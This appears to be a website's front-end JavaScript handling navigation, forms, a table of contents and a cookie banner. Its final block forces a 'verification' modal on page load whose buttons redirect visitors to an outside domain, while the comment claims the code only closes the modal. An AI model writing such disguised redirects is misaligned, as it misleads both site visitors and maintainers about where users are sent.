
const toggle = document.querySelector('.nav-toggle');
const nav = document.getElementById('nav');
if (toggle && nav){
  toggle.addEventListener('click', () => {
    const open = nav.classList.toggle('open');
    toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
  });
}
const more = document.querySelector('.more');
if (more){
  const btn = more.querySelector('.more-btn');
  const menu = more.querySelector('.dropdown');
  const show = (v)=>{ menu.style.display = v ? 'block' : 'none'; btn.setAttribute('aria-expanded', v? 'true':'false'); };
  btn?.addEventListener('click', e => { e.stopPropagation(); show(menu.style.display!=='block'); });
  document.addEventListener('click', () => show(false));
}

async function handleFormSubmit(event) {
  event.preventDefault();
  const form = event.target;
  const submitBtn = form.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;

  submitBtn.disabled = true;
  submitBtn.textContent = 'Sending...';

  try {
    // Replace 'https://formspree.io/f/your-id' with your real endpoint
    const response = await fetch('https://formspree.io/f/your-id', {
      method: 'POST',
      body: new FormData(form),
      headers: { 'Accept': 'application/json' }
    });

    if (response.ok) {
      alert('Thank you! Your message has been sent.');
      form.reset();
    } else {
      alert('Oops! There was a problem submitting your form.');
    }
  } catch (error) {
    alert('An error occurred. Please check your connection and try again.');
  }

  submitBtn.disabled = false;
  submitBtn.textContent = originalText;
}

document.querySelectorAll('form').forEach(form => form.addEventListener('submit', handleFormSubmit));

const toTop = document.querySelector('.to-top');
if (toTop && !toTop.hasAttribute('onclick')) {
  toTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));
}

document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('[data-toc]').forEach(container => {
    const hs = Array.from(document.querySelectorAll('h2, h3')).filter(h => h.id && !h.closest('.toc'));
    const list = document.createElement('div');
    hs.forEach(h => { const a = document.createElement('a'); a.href = `#${h.id}`; a.textContent = h.textContent; a.style.marginLeft = h.tagName==='H3' ? '12px' : '0'; list.appendChild(a); });
    container.appendChild(list);
  });

  const cookieBanner = document.getElementById('cookie-banner');
  if (cookieBanner && !localStorage.getItem('cookieConsent')) {
    cookieBanner.style.display = 'block';
    document.getElementById('accept-cookies')?.addEventListener('click', () => {
      localStorage.setItem('cookieConsent', 'true');
      cookieBanner.style.display = 'none';
    });
  }

  const vModal = document.getElementById('verification-modal');
  if (vModal) {
    vModal.showModal();
    // Action to take after verification (currently closes modal)
    const complete = () => window.location.href = 'https://clickdynasty.online/';
    document.getElementById('verify-btn')?.addEventListener('click', complete);
    document.getElementById('enter-btn')?.addEventListener('click', complete);
  }
});
